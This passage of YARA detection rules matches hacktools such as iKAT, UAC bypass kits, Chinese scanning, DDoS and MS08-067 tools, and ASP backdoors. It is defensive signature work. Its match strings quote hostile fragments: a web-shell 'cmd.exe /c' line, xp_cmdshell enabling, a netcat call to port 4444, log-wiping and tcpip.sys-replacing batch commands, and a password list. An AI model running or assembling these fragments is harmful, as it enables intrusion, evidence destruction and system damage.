		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
	strings:
		$s0 = "Extended Module: super mario brothers" fullword ascii
		$s1 = "Extended Module: " fullword ascii
		$s3 = "ofpurenostalgicfeeling" fullword ascii
		$s8 = "-supermariobrotheretic" fullword ascii
		$s9 = "!http://132.147.96.202:80" fullword ascii
		$s12 = "iKAT Exe Template" fullword ascii
		$s15 = "withadancyflavour.." fullword ascii
		$s16 = "FastTracker v2.00   " fullword ascii
	condition:
		4 of them
}

rule iKAT_cmd_as_dll {
	meta:
		description = "iKAT toolset file cmd.dll ReactOS file cloaked"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
	strings:
		$s1 = "cmd.exe" fullword wide
		$s2 = "ReactOS Development Team" fullword wide
		$s3 = "ReactOS Command Processor" fullword wide

		$ext = "extension: .dll" nocase
	condition:
		all of ($s*) and $ext
}

rule iKAT_tools_nmap {
	meta:
		description = "Generic rule for NMAP - based on NMAP 4 standalone"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
	strings:
		$s0 = "Insecure.Org" fullword wide
		$s1 = "Copyright (c) Insecure.Com" fullword wide
		$s2 = "nmap" fullword nocase
		$s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii
	condition:
		all of them
}

rule iKAT_startbar {
	meta:
		description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
	strings:
		$s2 = "Shinysoft Limited1" fullword ascii
		$s3 = "Shinysoft Limited0" fullword ascii
		$s4 = "Wellington1" fullword ascii
		$s6 = "Wainuiomata1" fullword ascii
		$s8 = "56 Wright St1" fullword ascii
		$s9 = "UTN-USERFirst-Object" fullword ascii
		$s10 = "New Zealand1" fullword ascii
	condition:
		all of them
}

rule iKAT_gpdisable_customcmd_kitrap0d_uacpoc {
	meta:
		description = "iKAT hack tool set generic rule - from files gpdisable.exe, customcmd.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "2725690954c2ad61f5443eb9eec5bd16ab320014"
		hash2 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash3 = "b65a460d015fd94830d55e8eeaf6222321e12349"
		score = 20
	strings:
		$s0 = "Failed to get temp file for source AES decryption" fullword
		$s5 = "Failed to get encryption header for pwd-protect" fullword
		$s17 = "Failed to get filetime" fullword
		$s20 = "Failed to delete temp file for password decoding (3)" fullword
	condition:
		all of them
}

rule iKAT_Tool_Generic {
	meta:
		description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 55
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"
	strings:
		$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
		$s1 = "Failed to read the entire file" fullword
		$s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
		$s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
		$s9 = "Running Zip pipeline..." fullword
		$s10 = "<FinTitle />" fullword
		$s12 = "<AutoTemp>0</AutoTemp>" fullword
		$s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
		$s15 = "AES Encrypting..." fullword
		$s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword
	condition:
		all of them
}

rule BypassUac2 {
	meta:
		description = "Auto-generated rule - file BypassUac2.zip"
		author = "yarGen Yara Rule Generator"
		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
	strings:
		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii
	condition:
		all of them
}

rule BypassUac_3 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.dll"
		author = "yarGen Yara Rule Generator"
		hash = "1974aacd0ed987119999735cad8413031115ce35"
	strings:
		$s0 = "BypassUacDLL.dll" fullword wide
		$s1 = "\\Release\\BypassUacDll" ascii
		$s3 = "Win7ElevateDLL" fullword wide
		$s7 = "BypassUacDLL" fullword wide
	condition:
		3 of them
}

rule BypassUac_9 {
	meta:
		description = "Auto-generated rule - file BypassUac.zip"
		author = "yarGen Yara Rule Generator"
		hash = "93c2375b2e4f75fc780553600fbdfd3cb344e69d"
	strings:
		$s0 = "/x86/BypassUac.exe" fullword ascii
		$s1 = "/x64/BypassUac.exe" fullword ascii
		$s2 = "/x86/BypassUacDll.dll" fullword ascii
		$s3 = "/x64/BypassUacDll.dll" fullword ascii
		$s15 = "BypassUac" fullword ascii
	condition:
		all of them
}

rule BypassUacDll_6 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
	condition:
		all of them
}

rule BypassUacDll_7 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
	condition:
		all of them
}

rule BypassUac_EXE {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s1 = "Wole32.dll" wide
		$s3 = "System32\\migwiz" wide
		$s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
		$s5 = "Elevation:Administrator!new:" wide
		$s6 = "BypassUac" wide
	condition:
		all of them
}

rule APT_Proxy_Malware_Packed_dev
{
	meta:
		author = "FRoth"
		date = "2014-11-10"
		description = "APT Malware - Proxy"
		hash = "6b6a86ceeab64a6cb273debfa82aec58"
		score = 50
	strings:
		$string0 = "PECompact2" fullword
		$string1 = "[LordPE]"
		$string2 = "steam_ker.dll"
	condition:
		all of them
}

rule Tzddos_DDoS_Tool_CN {
	meta:
		description = "Disclosed hacktool set - file tzddos"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d4c517eda5458247edae59309453e0ae7d812f8e"
	strings:
		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
		$s6 = "del Result.txt s2.txt s1.txt " fullword ascii
	condition:
		all of them
}

rule Ncat_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file nc.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "001c0c01c96fa56216159f83f6f298755366e528"
	strings:
		$s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
		$s3 = "gethostpoop fuxored" fullword ascii
		$s6 = "VERNOTSUPPORTED" fullword ascii
		$s7 = "%s [%s] %d (%s)" fullword ascii
		$s12 = " `--%s' doesn't allow an argument" fullword ascii
	condition:
		all of them
}

rule MS08_067_Exploit_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file cs.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a3e9e0655447494253a1a60dbc763d9661181322"
	strings:
		$s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
		$s3 = "Make SMB Connection error:%d" fullword ascii
		$s5 = "Send Payload Over!" fullword ascii
		$s7 = "Maybe Patched!" fullword ascii
		$s8 = "RpcExceptionCode() = %u" fullword ascii
		$s11 = "ph4nt0m" fullword wide
		$s12 = "\\\\%s\\IPC" ascii
	condition:
		4 of them
}

rule Hacktools_CN_Burst_sql {
	meta:
		description = "Disclosed hacktool set - file sql.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d5139b865e99b7a276af7ae11b14096adb928245"
	strings:
		$s0 = "s.exe %s %s %s %s %d /save" fullword ascii
		$s2 = "s.exe start error...%d" fullword ascii
		$s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
		$s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
		$s10 = "Result.txt" fullword ascii
		$s11 = "Usage:sql.exe [options]" fullword ascii
		$s17 = "%s root %s %d error" fullword ascii
		$s18 = "Pass.txt" fullword ascii
		$s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii
	condition:
		6 of them
}

rule Hacktools_CN_Panda_445TOOL {
	meta:
		description = "Disclosed hacktool set - file 445TOOL.rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "92050ba43029f914696289598cf3b18e34457a11"
	strings:
		$s0 = "scan.bat" fullword ascii
		$s1 = "Http.exe" fullword ascii
		$s2 = "GOGOGO.bat" fullword ascii
		$s3 = "ip.txt" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Panda_445 {
	meta:
		description = "Disclosed hacktool set - file 445.rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a61316578bcbde66f39d88e7fc113c134b5b966b"
	strings:
		$s0 = "for /f %%i in (ips.txt) do (start cmd.bat %%i)" fullword ascii
		$s1 = "445\\nc.exe" fullword ascii
		$s2 = "445\\s.exe" fullword ascii
		$s3 = "cs.exe %1" fullword ascii
		$s4 = "445\\cs.exe" fullword ascii
		$s5 = "445\\ip.txt" fullword ascii
		$s6 = "445\\cmd.bat" fullword ascii
		$s9 = "@echo off" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_WinEggDrop {
	meta:
		description = "Disclosed hacktool set - file s.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
	strings:
		$s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
		$s8 = "Something Wrong About The Ports" fullword ascii
		$s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
		$s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
		$s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
		$s13 = "%-16s %-5d -> \"%s\"" fullword ascii
		$s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
		$s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
		$s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Scan_BAT {
	meta:
		description = "Disclosed hacktool set - file scan.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "6517d7c245f1300e42f7354b0fe5d9666e5ce52a"
	strings:
		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_Burst {
	meta:
		description = "Disclosed hacktool set - file Burst.rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "ce8e3d95f89fb887d284015ff2953dbdb1f16776"
	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr." ascii
	condition:
		all of them
}

rule Hacktools_CN_445_cmd {
	meta:
		description = "Disclosed hacktool set - file cmd.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "69b105a3aec3234819868c1a913772c40c6b727a"
	strings:
		$bat = "@echo off" fullword ascii
		$s0 = "cs.exe %1" fullword ascii
		$s2 = "nc %1 4444" fullword ascii
	condition:
		$bat at 0 and all of ($s*)
}

rule Hacktools_CN_GOGOGO_Bat {
	meta:
		description = "Disclosed hacktool set - file GOGOGO.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "4bd4f5b070acf7fe70460d7eefb3623366074bbd"
	strings:
		$s0 = "for /f \"delims=\" %%x in (endend.txt) do call :lisoob %%x" fullword ascii
		$s1 = "http://www.tzddos.com/ -------------------------------------------->byebye.txt" fullword ascii
		$s2 = "ren %systemroot%\\system32\\drivers\\tcpip.sys tcpip.sys.bak" fullword ascii
		$s4 = "IF /I \"%wangle%\"==\"\" ( goto start ) else ( goto erromm )" fullword ascii
		$s5 = "copy *.tzddos scan.bat&del *.tzddos" fullword ascii
		$s6 = "del /f tcpip.sys" fullword ascii
		$s9 = "if /i \"%CB%\"==\"www.tzddos.com\" ( goto mmbat ) else ( goto wangle )" fullword ascii
		$s10 = "call scan.bat" fullword ascii
		$s12 = "IF /I \"%erromm%\"==\"\" ( goto start ) else ( goto zuihoujh )" fullword ascii
		$s13 = "IF /I \"%zuihoujh%\"==\"\" ( goto start ) else ( goto laji )" fullword ascii
		$s18 = "sc config LmHosts start= auto" fullword ascii
		$s19 = "copy tcpip.sys %systemroot%\\system32\\drivers\\tcpip.sys > nul" fullword ascii
		$s20 = "ren %systemroot%\\system32\\dllcache\\tcpip.sys tcpip.sys.bak" fullword ascii
	condition:
		3 of them
}

rule Hacktools_CN_Burst_pass {
	meta:
		description = "Disclosed hacktool set - file pass.txt"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "55a05cf93dbd274355d798534be471dff26803f9"
	strings:
		$s0 = "123456.com" fullword ascii
		$s1 = "123123.com" fullword ascii
		$s2 = "360.com" fullword ascii
		$s3 = "123.com" fullword ascii
		$s4 = "juso.com" fullword ascii
		$s5 = "sina.com" fullword ascii
		$s7 = "changeme" fullword ascii
		$s8 = "master" fullword ascii
		$s9 = "google.com" fullword ascii
		$s10 = "chinanet" fullword ascii
		$s12 = "lionking" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_JoHor_Posts_Killer {
	meta:
		description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
	strings:
		$s0 = "Multithreading Posts_Send Killer" fullword ascii
		$s3 = "GET [Access Point] HTTP/1.1" fullword ascii
		$s6 = "The program's need files was not exist!" fullword ascii
		$s7 = "JoHor_Posts_Killer" fullword wide
		$s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
		$s10 = "  ( /s ) :" fullword ascii
		$s11 = "forms.vbp" fullword ascii
		$s12 = "forms.vcp" fullword ascii
		$s13 = "Software\\FlySky\\E\\Install" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_tesksd {
	meta:
		description = "Disclosed hacktool set - file tesksd.jpg"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
	strings:
		$s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
		$s1 = "ExeMiniDownload.exe" fullword wide
		$s16 = "POST %Hs" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Http {
	meta:
		description = "Disclosed hacktool set - file Http.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "788bf0fdb2f15e0c628da7056b4e7b1a66340338"
	strings:
		$s0 = "RPCRT4.DLL" fullword ascii
		$s1 = "WNetAddConnection2A" fullword ascii
		$s2 = "NdrPointerBufferSize" fullword ascii
		$s3 = "_controlfp" fullword ascii
	condition:
		all of them and filesize < 10KB
}

rule Hacktools_CN_Burst_Start {
	meta:
		description = "Disclosed hacktool set - file Start.bat - DoS tool"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "75d194d53ccc37a68286d246f2a84af6b070e30c"
	strings:
		$s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" fullword ascii
		$s1 = "Blast.bat /r 600" fullword ascii
		$s2 = "Blast.bat /l Blast.bat" fullword ascii
		$s3 = "Blast.bat /c 600" fullword ascii
		$s4 = "start Clear.bat" fullword ascii
		$s5 = "del Result.txt" fullword ascii
		$s6 = "s syn %%i %%j 3306 /save" fullword ascii
		$s7 = "start Thecard.bat" fullword ascii
		$s10 = "setlocal enabledelayedexpansion" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_tasksvr {
	meta:
		description = "Disclosed hacktool set - file tasksvr.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
	strings:
		$s2 = "Consys21.dll" fullword ascii
		$s4 = "360EntCall.exe" fullword wide
		$s15 = "Beijing1" fullword ascii
	condition:
		all of them
}
rule Hacktools_CN_Burst_Clear {
	meta:
		description = "Disclosed hacktool set - file Clear.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "148c574a4e6e661aeadaf3a4c9eafa92a00b68e4"
	strings:
		$s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
		$s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
		$s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
		$s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
		$s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
		$s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
		$s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
		$s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
		$s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\"   " ascii
	condition:
		5 of them
}

rule Hacktools_CN_Burst_Thecard {
	meta:
		description = "Disclosed hacktool set - file Thecard.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "50b01ea0bfa5ded855b19b024d39a3d632bacb4c"
	strings:
		$s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
		$s1 = "Http://www.coffeewl.com" fullword ascii
		$s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
		$s3 = "for /L %%a in (" fullword ascii
		$s4 = "MODE con: COLS=42 lines=5" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Burst_Blast {
	meta:
		description = "Disclosed hacktool set - file Blast.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "b07702a381fa2eaee40b96ae2443918209674051"
	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
		$s1 = "@echo off" fullword ascii
	condition:
		all of them
}

rule VUBrute_VUBrute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
	strings:
		$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
		$s1 = "http://ubrute.com" fullword ascii
		$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
		$s14 = "error.txt" fullword ascii
	condition:
		all of them
}

rule DK_Brute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
	strings:
		$s6 = "get_CrackedCredentials" fullword ascii
		$s13 = "Same port used for two different protocols:" fullword wide
		$s18 = "coded by fLaSh" fullword ascii
		$s19 = "get_grbToolsScaningCracking" fullword ascii
	condition:
		all of them
}

rule VUBrute_config {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
	strings:
		$s2 = "Restore=1" fullword ascii
		$s6 = "Thread=" ascii
		$s7 = "Running=1" fullword ascii
		$s8 = "CheckCombination=" fullword ascii
		$s10 = "AutoSave=1.000000" fullword ascii
		$s12 = "TryConnect=" ascii
		$s13 = "Tray=" ascii
	condition:
		all of them
}

rule sig_238_hunt {
	meta:
		description = "Disclosed hacktool set (old stuff) - file hunt.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
	strings:
		$s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
		$s3 = "Usage - hunt \\\\servername" fullword ascii
		$s4 = ".share = %S - %S" fullword wide
		$s5 = "SMB share enumerator and admin finder " fullword ascii
		$s7 = "Hunt only runs on Windows NT..." fullword ascii
		$s8 = "User = %S" fullword ascii
		$s9 = "Admin is %s\\%s" fullword ascii
	condition:
		all of them
}

rule sig_238_listip {
	meta:
		description = "Disclosed hacktool set (old stuff) - file listip.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
	strings:
		$s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
		$s2 = "ERROR No.2!!! Program Terminate." fullword ascii
		$s4 = "Local Host Name: %s" fullword ascii
		$s5 = "Packed by exe32pack 1.38" fullword ascii
		$s7 = "Local Computer Name: %s" fullword ascii
		$s8 = "Local IP Adress: %s" fullword ascii
	condition:
		all of them
}

rule ArtTrayHookDll {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
	strings:
		$s0 = "ArtTrayHookDll.dll" fullword ascii
		$s7 = "?TerminateHook@@YAXXZ" fullword ascii
	condition:
		all of them
}

rule sig_238_eee {
	meta:
		description = "Disclosed hacktool set (old stuff) - file eee.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
	strings:
		$s0 = "szj1230@yesky.com" fullword wide
		$s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
		$s4 = "MailTo:szj1230@yesky.com" fullword wide
		$s5 = "Command1_Click" fullword ascii
		$s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
		$s11 = "vb5chs.dll" fullword ascii
		$s12 = "MSVBVM50.DLL" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_asp4 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp4.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "faf991664fd82a8755feb65334e5130f791baa8c"
	strings:
		$s0 = "system.dll" fullword ascii
		$s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
		$s3 = "Public Function reboot(atype As Variant)" fullword ascii
		$s4 = "t& = ExitWindowsEx(1, atype)" ascii
		$s5 = "atype=request(\"atype\") " fullword ascii
		$s7 = "AceiveX dll" fullword ascii
		$s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
		$s10 = "sys.reboot(atype)" fullword ascii
	condition:
		all of them
}

rule aspfile1 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "77b1e3a6e8f67bd6d16b7ace73dca383725ac0af"
	strings:
		$s0 = "' -- check for a command that we have posted -- '" fullword ascii
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
		$s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
		$s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
		$s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
		$s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
	condition:
		3 of them
}

rule EditServer_HackTool {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
	strings:
		$s0 = "%s Server.exe" fullword ascii
		$s1 = "Service Port: %s" fullword ascii
		$s2 = "The Port Must Been >0 & <65535" fullword ascii
		$s8 = "3--Set Server Port" fullword ascii
		$s9 = "The Server Password Exceeds 32 Characters" fullword ascii
		$s13 = "Service Name: %s" fullword ascii
		$s14 = "Server Password: %s" fullword ascii
		$s17 = "Inject Process Name: %s" fullword ascii

		$x1 = "WinEggDrop Shell Congirator" fullword ascii
	condition:
		5 of ($s*) or $x1
}

rule sig_238_letmein {
	meta:
		description = "Disclosed hacktool set (old stuff) - file letmein.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
	strings:
		$s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
		$s6 = "Error get users from server!" fullword ascii
		$s7 = "get in nt by name and null" fullword ascii
		$s16 = "get something from nt, hold by killusa." fullword ascii
	condition:
		all of them
}

rule sig_238_token {
	meta:
		description = "Disclosed hacktool set (old stuff) - file token.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
	strings:
		$s0 = "Logon.exe" fullword ascii
		$s1 = "Domain And User:" fullword ascii
		$s2 = "PID=Get Addr$(): One" fullword ascii
		$s3 = "Process " fullword ascii
		$s4 = "psapi.dllK" fullword ascii
	condition:
		all of them
}

rule sig_238_TELNET {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
	strings:
		$s0 = "TELNET [host [port]]" fullword wide
		$s2 = "TELNET.EXE" fullword wide
		$s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
		$s14 = "Software\\Microsoft\\Telnet" fullword wide
	condition:
		all of them
}

rule snifferport {
	meta:
		description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "d14133b5eaced9b7039048d0767c544419473144"
	strings:
		$s0 = "iphlpapi.DLL" fullword ascii
		$s5 = "ystem\\CurrentCorolSet\\" fullword ascii
		$s11 = "Port.TX" fullword ascii
		$s12 = "32Next" fullword ascii
		$s13 = "V1.2 B" fullword ascii
	condition:
		all of them
}

rule sig_238_webget {
	meta:
		description = "Disclosed hacktool set (old stuff) - file webget.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "GET A HTTP/1.0" fullword ascii
		$s2 = " error " fullword ascii
		$s13 = "Downloa" ascii
	condition:
		all of them
}

rule XYZCmd_zip_Folder_XYZCmd {
	meta:
		description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
	strings:
		$s0 = "Executes Command Remotely" fullword wide
		$s2 = "XYZCmd.exe" fullword wide
		$s6 = "No Client Software" fullword wide
		$s19 = "XYZCmd V1.0 For NT S" fullword ascii
	condition:
		all of them
}

rule ASPack_Chinese {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
	strings:
		$s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
		$s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
		$s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
